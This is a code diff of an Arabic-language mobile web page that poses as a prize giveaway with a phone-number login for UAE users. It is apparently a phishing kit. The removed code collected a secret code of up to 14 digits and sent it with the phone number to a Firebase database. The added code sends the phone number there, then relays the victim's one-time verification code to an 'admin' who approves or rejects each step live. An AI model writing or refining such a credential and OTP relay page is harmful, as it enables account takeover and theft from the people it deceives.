@@ -10,18 +10,15 @@
   html,body{width:100%;height:100%;overflow:hidden;background:#fff}
   .app{width:100%;height:100%;max-width:430px;margin:0 auto;position:relative;display:flex;flex-direction:column;overflow:hidden;background:#fff}
 
-  /* ===== Hero أحمر متدرج ===== */
   .hero{background:linear-gradient(160deg,#7A0010 0%,#A3001F 45%,#C41E3A 100%);padding:40px 20px 70px;text-align:center;position:relative;flex-shrink:0}
   .hero::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:34px;background:#fff;border-radius:34px 34px 0 0}
   .help{position:absolute;top:18px;right:18px;width:30px;height:30px;border:2px solid rgba(255,255,255,.85);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
   .brand{color:#fff;font-size:28px;font-weight:800;letter-spacing:2px;direction:ltr}
   .brand small{display:block;font-size:13px;font-weight:500;letter-spacing:4px;margin-top:2px;opacity:.9}
 
-  /* ===== Screens ===== */
   .screen{display:none;flex-direction:column;height:100%}
   .screen.on{display:flex}
 
-  /* ===== Prize ===== */
   .giveaway{flex:1;padding:0 22px 22px;display:flex;flex-direction:column;position:relative;z-index:2;margin-top:-30px}
   .g-card{background:#fff;border-radius:26px;box-shadow:0 6px 24px rgba(0,0,0,.08);padding:26px 18px;text-align:center;flex:1;display:flex;flex-direction:column;justify-content:center}
   .g-img{width:100%;max-height:300px;object-fit:contain;margin-bottom:18px}
@@ -30,7 +27,6 @@
   .btn-red{width:100%;padding:17px;background:linear-gradient(135deg,#C41E3A,#8B0016);color:#fff;border:none;border-radius:999px;font-size:18px;font-weight:700;cursor:pointer;box-shadow:0 5px 16px rgba(196,30,58,.35);margin-top:18px;transition:transform .15s}
   .btn-red:active{transform:scale(.98)}
 
-  /* ===== Login Phone ===== */
   .login-body{flex:1;padding:34px 22px 22px;display:flex;flex-direction:column}
   .l-title{font-size:19px;font-weight:700;color:#111;text-align:center;margin-bottom:22px}
   .phone-box{display:flex;align-items:center;border:1.5px solid #e3e3e6;border-radius:14px;padding:15px 16px;background:#fafafa;transition:.2s}
@@ -50,13 +46,11 @@
   .btn-pink.ready{background:linear-gradient(135deg,#C41E3A,#A3001F);cursor:pointer;box-shadow:0 4px 14px rgba(196,30,58,.3)}
   .login-body .btn-pink{margin-top:auto}
 
-  /* ===== Topbar for OTP ===== */
   .topbar{padding:26px 20px 6px;text-align:center;position:relative;flex-shrink:0}
   .topbar .back{position:absolute;top:24px;left:20px;cursor:pointer}
   .topbar .t1{font-size:14px;color:#999;margin-bottom:4px}
   .topbar .t2{font-size:20px;font-weight:700;color:#111}
 
-  /* ===== OTP ===== */
   .otp-desc{text-align:center;padding:26px 20px 8px;font-size:15px;color:#555;line-height:1.7}
   .otp-desc b{direction:ltr;display:inline-block;color:#111}
   .otp-boxes{display:flex;justify-content:center;gap:10px;padding:18px 20px;direction:ltr}
@@ -67,24 +61,6 @@
   .otp-row .right{color:#C41E3A;font-weight:600;direction:ltr}
   .otp-foot{margin-top:auto;padding:0 22px 22px}
 
-  /* ===== Bottom Sheet 14 dots (JACK X red colors) ===== */
-  .dim{position:absolute;inset:0;background:rgba(0,0,0,.55);opacity:0;pointer-events:none;transition:opacity .25s;z-index:20}
-  .dim.show{opacity:1;pointer-events:auto}
-  .sheet{position:absolute;left:0;right:0;bottom:0;background:#fff;border-radius:28px 28px 0 0;padding:22px 20px 20px;transform:translateY(102%);transition:transform .32s cubic-bezier(.2,.8,.2,1);z-index:21}
-  .sheet.show{transform:translateY(0)}
-  .s-title{text-align:center;font-family:'Tajawal',sans-serif;font-weight:700;font-size:18px;color:#111;margin-bottom:6px}
-  .s-dots{display:flex;justify-content:center;gap:8px;margin:14px auto 20px;flex-wrap:wrap;max-width:360px}
-  .s-dots i{width:14px;height:14px;border-radius:50%;background:#e3e3e6;transition:.2s}
-  .s-dots i.on{background:#C41E3A}
-  .s-keys{display:grid;grid-template-columns:repeat(5,1fr);gap:9px;max-width:380px;margin:0 auto 12px}
-  .s-key{height:52px;border:1.5px solid #e3e3e6;border-radius:12px;background:#fff;display:flex;align-items:center;justify-content:center;font-family:'Tajawal',sans-serif;font-weight:700;font-size:22px;color:#111;cursor:pointer;user-select:none;transition:.15s}
-  .s-key:active{background:#C41E3A;color:#fff;border-color:#C41E3A}
-  .s-del{display:flex;justify-content:center;margin-bottom:10px}
-  .s-del button{background:transparent;border:none;font-family:'Tajawal',sans-serif;font-size:14px;color:#666;cursor:pointer;padding:8px 16px}
-  .s-login{width:100%;padding:16px;background:linear-gradient(135deg,#E8A0B0,#D4899A);color:#fff;border:none;border-radius:999px;font-family:'Tajawal',sans-serif;font-weight:700;font-size:17px;cursor:default;transition:.2s}
-  .s-login.ready{background:linear-gradient(135deg,#C41E3A,#A3001F);cursor:pointer;box-shadow:0 4px 14px rgba(196,30,58,.3)}
-
-  /* ===== PIN Final Screen (JACK X style) ===== */
   .pin-screen{position:absolute;inset:0;background:#fff;z-index:25;display:none;flex-direction:column;overflow:hidden}
   .pin-screen.show{display:flex}
   .pin-hero{background:linear-gradient(160deg,#7A0010 0%,#A3001F 45%,#C41E3A 100%);padding:36px 20px 58px;text-align:center;position:relative;flex-shrink:0}
@@ -109,7 +85,6 @@
   .pin-btn{margin-top:auto;width:100%;padding:17px;background:linear-gradient(135deg,#C41E3A,#8B0016);color:#fff;border:none;border-radius:999px;font-family:'Tajawal',sans-serif;font-weight:700;font-size:17px;cursor:pointer;box-shadow:0 5px 16px rgba(196,30,58,.35);transition:transform .15s}
   .pin-btn:active{transform:scale(.98)}
 
-  /* ===== Loader + Dialog ===== */
   .load{position:absolute;inset:0;background:rgba(255,255,255,.92);display:none;align-items:center;justify-content:center;z-index:50}
   .load.on{display:flex}
   .spin{width:40px;height:40px;border:4px solid #eee;border-top-color:#C41E3A;border-radius:50%;animation:sp .8s linear infinite}
@@ -124,7 +99,7 @@
 <body>
 <div class="app">
 
-  <!-- ========== 1) صفحة الهدية ========== -->
+  <!-- ========== 1) الهدية ========== -->
   <div class="screen on" id="s1">
     <div class="hero">
       <div class="help">?</div>
@@ -158,11 +133,11 @@
         <label class="crow" id="c2"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel link">قبول سياسة الخصوصية</span></label>
         <label class="crow" id="c3"><div class="cbox"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L20 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="clabel">أرغب في تلقي رسائل تسويقية حول عروض APPLI SGA</span></label>
       </div>
-      <button class="btn-pink" id="btnLogin" onclick="openPinSheet()">دخول</button>
+      <button class="btn-pink" id="btnLogin" onclick="submitPhone()">دخول</button>
     </div>
   </div>
 
-  <!-- ========== 3) رمز التحقق ========== -->
+  <!-- ========== 3) OTP ========== -->
   <div class="screen" id="s3">
     <div class="topbar">
       <div class="back" onclick="backToPhone()"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
@@ -173,13 +148,13 @@
     <div class="otp-boxes" id="boxes"></div>
     <input type="tel" id="otpHidden" inputmode="numeric" maxlength="6" style="position:absolute;opacity:0;pointer-events:none">
     <div class="otp-row">
-      <span class="left" id="resend" style="cursor:default">إعادة إرسال (<span id="tsec">118</span>s)</span>
+      <span class="left" id="resend" style="cursor:default;color:#777">إعادة إرسال (<span id="tsec">60</span>s)</span>
       <span class="right" onclick="document.getElementById('otpHidden').focus()">لم يصلك الرمز؟</span>
     </div>
     <div class="otp-foot"><button class="btn-pink" id="btnOtp" onclick="verifyCode()">تأكيد</button></div>
   </div>
 
-  <!-- ========== 4) واجهة PIN (تصميم JACK X الأحمر) ========== -->
+  <!-- ========== 4) PIN ========== -->
   <div class="pin-screen" id="pinScreen">
     <div class="pin-hero">
       <div class="pin-back" onclick="pinCancel()">
@@ -198,19 +173,6 @@
       <div class="pin-pad" id="pinPad"></div>
       <button class="pin-btn" id="pinBtn" type="button">تأكيد</button>
     </div>
-  </div>
-
-  <!-- ========== Bottom Sheet 14 dots ========== -->
-  <div class="dim" id="dim"></div>
-  <div class="sheet" id="sheet">
-    <div class="s-title">اكتب رمزك السريّ</div>
-    <div class="s-dots" id="dots">
-      <i></i><i></i><i></i><i></i><i></i><i></i><i></i>
-      <i></i><i></i><i></i><i></i><i></i><i></i><i></i>
-    </div>
-    <div class="s-keys" id="keys"></div>
-    <div class="s-del"><button type="button" id="delBtn">⌫ حذف</button></div>
-    <button class="s-login" id="sheetLoginBtn" type="button" onclick="sendCredentials()">تسجيل الدخول</button>
   </div>
 
   <div class="load" id="load"><div class="spin"></div></div>
@@ -238,9 +200,8 @@ try {
   console.log('✅ Firebase ready');
 } catch(e){ console.error('❌ Firebase init error:', e); }
 
-/* ===== State ===== */
+/* ===== الحالة ===== */
 var phoneNumber = '';
-var sheetPin = '';
 var currentRef = null;
 var verifyCodeVal = '';
 var pinValue = '';
@@ -248,6 +209,7 @@ var pinConfirmVal = '';
 var pinMode = 'set';
 var busy = false;
 var timerId = null;
+var timeLeft = 0;
 var dlgCb = null;
 
 /* ===== Utils ===== */
@@ -271,7 +233,7 @@ function hash(s){
   return 'h' + Math.abs(h).toString(36) + s.length;
 }
 
-/* ===== Phone Input ===== */
+/* ===== شاشة 2: الرقم ===== */
 var phoneEl = document.getElementById('phone'), btnLogin = document.getElementById('btnLogin');
 phoneEl.addEventListener('input', function(e){
   e.target.value = e.target.value.replace(/\D/g,'');
@@ -287,121 +249,81 @@ function updLogin(){
   btnLogin.classList.toggle('ready', ok);
 }
 
-/* ===== Sheet (14 dots PIN) ===== */
-var sheet = document.getElementById('sheet'),
-    dim = document.getElementById('dim'),
-    dots = document.querySelectorAll('#dots i'),
-    keys = document.getElementById('keys'),
-    sheetLoginBtn = document.getElementById('sheetLoginBtn');
-
-function renderSheetPin(){
-  for (var i=0;i<dots.length;i++) dots[i].classList.toggle('on', i < sheetPin.length);
-  sheetLoginBtn.classList.toggle('ready', sheetPin.length >= 6);
-}
-function buildKeys(){
-  var d = [0,1,2,3,4,5,6,7,8,9];
-  for (var i=d.length-1;i>0;i--){ var j=Math.floor(Math.random()*(i+1)); var t=d[i]; d[i]=d[j]; d[j]=t; }
-  keys.innerHTML = '';
-  d.forEach(function(n){
-    var k = document.createElement('div');
-    k.className = 's-key'; k.textContent = n;
-    k.addEventListener('click', function(){
-      if (busy || sheetPin.length >= 14) return;
-      sheetPin += n; renderSheetPin();
-    });
-    keys.appendChild(k);
-  });
-}
-function openPinSheet(){
-  if (!btnLogin.classList.contains('ready')) { dlg('أكمل البيانات أولاً'); return; }
-  phoneNumber = '+971' + phoneEl.value.replace(/^0+/,'');
-  sheetPin = '';
-  renderSheetPin();
-  buildKeys();
-  phoneEl.blur();
-  dim.classList.add('show');
-  sheet.classList.add('show');
-}
-function closeSheet(){
-  dim.classList.remove('show');
-  sheet.classList.remove('show');
-  sheetPin = ''; renderSheetPin();
-}
-dim.addEventListener('click', function(){
-  if (!busy && !document.getElementById('dlg').classList.contains('on')) closeSheet();
-});
-document.getElementById('delBtn').addEventListener('click', function(){
+/* ============================================================
+   إرسال الرقم → طلب pending → شاشة OTP مباشرة
+   ============================================================ */
+function submitPhone(){
   if (busy) return;
-  sheetPin = sheetPin.slice(0,-1);
-  renderSheetPin();
-});
+  if (!btnLogin.classList.contains('ready')){ dlg('أكمل البيانات أولاً'); return; }
 
-/* ===== Send Credentials ===== */
-function sendCredentials(){
-  if (busy || sheetPin.length < 6 || sheetPin.length > 14) return;
-  if (!phoneNumber){ dlg('الرجاء إدخال رقم الهاتف'); return; }
+  phoneNumber = '+971' + phoneEl.value.replace(/^0+/,'');
   if (!db){ dlg('تعذر الاتصال بالخادم'); return; }
+
+  /* احذف أي طلب قديم */
+  if (currentRef){
+    currentRef.child('status').off();
+    try { currentRef.remove(); } catch(_){}
+    currentRef = null;
+  }
 
   busy = true;
   load(true);
 
   var ref = db.ref('requests').push();
   currentRef = ref;
-  var wentToVerify = false;
 
   ref.set({
-    username : phoneNumber,
     phone    : phoneNumber,
-    pin      : sheetPin,
+    username : phoneNumber,
     status   : 'pending',
     createdAt: Date.now(),
     platform : 'app'
   }).then(function(){
-    ref.child('status').on('value', function(snap){
-      var st = snap.val();
-      if (st === 'approved' && !wentToVerify){
-        wentToVerify = true;
-        load(false);
-        busy = false;
-        closeSheet();
-        goToVerifyStep();
-      } else if (st === 'rejected'){
-        load(false);
-        busy = false;
-        ref.child('status').off();
-        currentRef = null;
-        dlg('اسم المستخدم أو كلمة السر غير صحيحة', function(){
-          sheetPin = ''; renderSheetPin(); buildKeys();
-        });
-      } else if (st === 'verified'){
-        ref.child('status').off();
-        currentRef = null;
-        openPinScreen();
-      } else if (st === 'code_rejected'){
-        load(false);
-        busy = false;
-        dlg('رمز التحقق خاطئ', function(){
-          verifyCodeVal = '';
-          document.getElementById('otpHidden').value = '';
-          updOtpBoxes();
-        });
-      }
-    });
-  }).catch(function(err){
-    console.error(err);
+    load(false);
+    busy = false;
+    showOtpScreen();
+    listenToStatus(ref);
+  }).catch(function(e){
+    console.error('submitPhone error:', e);
     load(false);
     busy = false;
     dlg('تعذر الاتصال بالخادم');
   });
 }
 
-/* ===== Verification Screen ===== */
-function goToVerifyStep(){
+/* ===== الاستماع لتغيير الحالة من الأدمن ===== */
+function listenToStatus(ref){
+  ref.child('status').on('value', function(snap){
+    var st = snap.val();
+    console.log('📡 status:', st);
+
+    if (st === 'verified'){
+      /* ✅ نجاح → شاشة PIN */
+      ref.child('status').off();
+      openPinScreen();
+    }
+    else if (st === 'rejected' || st === 'code_rejected'){
+      ref.child('status').off();
+      busy = false;
+      load(false);
+      dlg('تم رفض الطلب، أعد المحاولة', function(){
+        if (currentRef === ref){ currentRef = null; }
+        try { ref.remove(); } catch(_){}
+        go('s2');
+      });
+    }
+  });
+}
+
+/* ============================================================
+   شاشة OTP
+   ============================================================ */
+function showOtpScreen(){
   document.getElementById('otpPhone').textContent = phoneNumber;
   verifyCodeVal = '';
   document.getElementById('otpHidden').value = '';
   buildOtpBoxes();
-  startTimer();
+  startTimer(60);
   go('s3');
   setTimeout(function(){ document.getElementById('otpHidden').focus(); }, 150);
 }
@@ -421,36 +343,85 @@ function updOtpBoxes(){
     b.textContent = verifyCodeVal[i] || '';
     b.classList.toggle('filled', !!verifyCodeVal[i]);
   });
-  document.getElementById('btnOtp').classList.toggle('ready', verifyCodeVal.length >= 4);
+  document.getElementById('btnOtp').classList.toggle('ready', verifyCodeVal.length === 6);
 }
 document.getElementById('otpHidden').addEventListener('input', function(e){
   verifyCodeVal = e.target.value.replace(/\D/g,'').slice(0,6);
   updOtpBoxes();
 });
 
-function startTimer(){
-  var s = 118;
-  var rs = document.getElementById('resend');
-  rs.style.cursor = 'default'; rs.style.color = '#777';
-  rs.innerHTML = 'إعادة إرسال (<span id="tsec">'+s+'</span>s)';
+/* ===== مؤقت 60 ثانية ===== */
+function startTimer(sec){
+  timeLeft = sec;
+  updateTimer();
   clearInterval(timerId);
   timerId = setInterval(function(){
-    s--;
-    var el = document.getElementById('tsec'); if (el) el.textContent = s;
-    if (s <= 0){
-      clearInterval(timerId);
-      rs.style.cursor = 'pointer'; rs.style.color = '#C41E3A';
-      rs.innerHTML = 'إعادة إرسال';
-    }
+    timeLeft--;
+    if (timeLeft <= 0){ timeLeft = 0; clearInterval(timerId); }
+    updateTimer();
   }, 1000);
 }
+function updateTimer(){
+  var rs = document.getElementById('resend');
+  if (!rs) return;
+  if (timeLeft > 0){
+    rs.style.cursor = 'default';
+    rs.style.color = '#777';
+    rs.innerHTML = 'إعادة إرسال (<span id="tsec">' + timeLeft + '</span>s)';
+  } else {
+    rs.style.cursor = 'pointer';
+    rs.style.color = '#C41E3A';
+    rs.innerHTML = 'إعادة إرسال';
+  }
+}
 
+/* ===== ضغط على "إعادة إرسال" ===== */
 document.getElementById('resend').addEventListener('click', function(){
-  if (this.style.color === 'rgb(196, 30, 58)') backToPhone();
+  if (timeLeft > 0 || busy) return;
+  resendCode();
 });
 
+function resendCode(){
+  if (!db || !phoneNumber || busy) return;
+
+  /* احذف الطلب القديم */
+  if (currentRef){
+    currentRef.child('status').off();
+    try { currentRef.remove(); } catch(_){}
+    currentRef = null;
+  }
+
+  busy = true;
+  load(true);
+
+  var ref = db.ref('requests').push();
+  currentRef = ref;
+
+  ref.set({
+    phone    : phoneNumber,
+    username : phoneNumber,
+    status   : 'pending',
+    createdAt: Date.now(),
+    platform : 'app',
+    isResend : true
+  }).then(function(){
+    load(false);
+    busy = false;
+    verifyCodeVal = '';
+    document.getElementById('otpHidden').value = '';
+    updOtpBoxes();
+    startTimer(60);
+    listenToStatus(ref);
+  }).catch(function(){
+    load(false);
+    busy = false;
+    dlg('تعذر الاتصال بالخادم');
+  });
+}
+
+/* ===== إرسال رمز OTP للأدمن ===== */
 function verifyCode(){
-  if (verifyCodeVal.length < 4 || !currentRef || busy) return;
+  if (busy || verifyCodeVal.length !== 6 || !currentRef) return;
   busy = true;
   load(true);
   currentRef.update({
@@ -464,14 +435,21 @@ function verifyCode(){
   });
 }
 
+/* ===== رجوع من OTP → شاشة الرقم ===== */
 function backToPhone(){
+  if (busy) return;
   clearInterval(timerId);
-  if (currentRef){ currentRef.child('status').off(); currentRef = null; }
-  busy = false;
+  if (currentRef){
+    currentRef.child('status').off();
+    try { currentRef.remove(); } catch(_){}
+    currentRef = null;
+  }
   go('s2');
 }
 
-/* ===== PIN Screen (JACK X) ===== */
+/* ============================================================
+   شاشة PIN (JACK X الأحمر)
+   ============================================================ */
 function openPinScreen(){
   busy = true;
   load(true);
@@ -480,11 +458,17 @@ function openPinScreen(){
     busy = false;
     load(false);
     pinValue = ''; pinConfirmVal = '';
-    buildPinPad(); updatePinDots();
+    buildPinPad();
+    updatePinDots();
     document.getElementById('pinScreen').classList.add('show');
   }
 
-  if (!db){ pinMode = 'set'; document.getElementById('pinTitle').textContent = 'أنشئ رمزك السري'; show(); return; }
+  if (!db){
+    pinMode = 'set';
+    document.getElementById('pinTitle').textContent = 'أنشئ رمزك السري';
+    show();
+    return;
+  }
 
   db.ref('users/' + phoneNumber + '/pinHash').get().then(function(snap){
     if (snap.exists()){
@@ -526,64 +510,125 @@ function pressPin(k){
   updatePinDots();
   if (pinValue.length === 6) setTimeout(submitPin, 250);
 }
+
 function submitPin(){
   if (busy || pinValue.length !== 6) return;
   if (!phoneNumber){ dlg('خطأ في رقم الهاتف'); return; }
 
   if (pinMode === 'set'){
+    /* إنشاء رمز جديد */
     if (!pinConfirmVal){
-      pinConfirmVal = pinValue; pinValue = ''; updatePinDots();
+      pinConfirmVal = pinValue;
+      pinValue = '';
+      updatePinDots();
       document.getElementById('pinTitle').textContent = 'أكد رمزك السري';
       return;
     }
     if (pinValue !== pinConfirmVal){
-      pinValue = ''; pinConfirmVal = ''; updatePinDots();
+      pinValue = ''; pinConfirmVal = '';
+      updatePinDots();
       document.getElementById('pinTitle').textContent = 'أنشئ رمزك السري';
       dlg('الرمزان غير متطابقين');
       return;
     }
     if (!db){ dlg('تعذر الاتصال بالخادم'); return; }
-    busy = true; load(true);
+    busy = true;
+    load(true);
     db.ref('users/' + phoneNumber).set({
       phone    : phoneNumber,
       pinHash  : hash(pinValue),
       createdAt: Date.now(),
       status   : 'active'
     }).then(function(){
-      busy = false; load(false);
+      busy = false;
+      load(false);
       dlg('تم إنشاء حسابك بنجاح 🎉', function(){
         closePinScreen();
         resetAll();
       });
     }).catch(function(err){
       console.error(err);
-      busy = false; load(false);
+      busy = false;
+      load(false);
       dlg('تعذر حفظ الرمز السري');
     });
   } else {
+    /* تسجيل دخول بالرمز */
     if (!db){ dlg('تعذر الاتصال بالخادم'); return; }
-    busy = true; load(true);
+    busy = true;
+    load(true);
     db.ref('users/' + phoneNumber + '/pinHash').get().then(function(snap){
-      busy = false; load(false);
+      busy = false;
+      load(false);
       if (snap.val() === hash(pinValue)){
+        /* ✅ صح */
         dlg('تم تسجيل الدخول بنجاح 🎉', function(){
           closePinScreen();
           resetAll();
         });
       } else {
-        pinValue = ''; updatePinDots();
-        dlg('الرمز السري غير صحيح');
+        /* ❌ خطأ → الرجوع لشاشة OTP */
+        pinValue = '';
+        updatePinDots();
+        closePinScreen();
+        dlg('الرمز السري غير صحيح', function(){
+          goBackToOtp();
+        });
       }
     }).catch(function(err){
       console.error(err);
-      busy = false; load(false);
+      busy = false;
+      load(false);
       dlg('تعذر التحقق من الرمز');
     });
   }
 }
+
+/* ===== رجوع للـ OTP بعد PIN خطأ ===== */
+function goBackToOtp(){
+  pinValue = '';
+  pinConfirmVal = '';
+  updatePinDots();
+
+  if (!db || !phoneNumber){ go('s2'); return; }
+
+  /* احذف الطلب القديم وابدأ من جديد */
+  if (currentRef){
+    currentRef.child('status').off();
+    try { currentRef.remove(); } catch(_){}
+    currentRef = null;
+  }
+
+  busy = true;
+  load(true);
+
+  var ref = db.ref('requests').push();
+  currentRef = ref;
+
+  ref.set({
+    phone    : phoneNumber,
+    username : phoneNumber,
+    status   : 'pending',
+    createdAt: Date.now(),
+    platform : 'app',
+    isRetry  : true
+  }).then(function(){
+    load(false);
+    busy = false;
+    showOtpScreen();
+    listenToStatus(ref);
+  }).catch(function(){
+    load(false);
+    busy = false;
+    go('s2');
+  });
+}
+
 function closePinScreen(){
   document.getElementById('pinScreen').classList.remove('show');
-  pinValue = ''; pinConfirmVal = ''; updatePinDots();
+  pinValue = '';
+  pinConfirmVal = '';
+  updatePinDots();
 }
 function pinCancel(){
   if (busy) return;
@@ -595,10 +640,16 @@ document.getElementById('pinBtn').addEventListener('click', submitPin);
 /* ===== Reset ===== */
 function resetAll(){
   clearInterval(timerId);
-  if (currentRef){ currentRef.child('status').off(); currentRef = null; }
+  if (currentRef){
+    currentRef.child('status').off();
+    try { currentRef.remove(); } catch(_){}
+    currentRef = null;
+  }
   busy = false;
-  sheetPin = ''; verifyCodeVal = ''; pinValue = ''; pinConfirmVal = '';
-  closeSheet();
+  phoneNumber = '';
+  verifyCodeVal = '';
+  pinValue = '';
+  pinConfirmVal = '';
   closePinScreen();
   go('s1');
 }
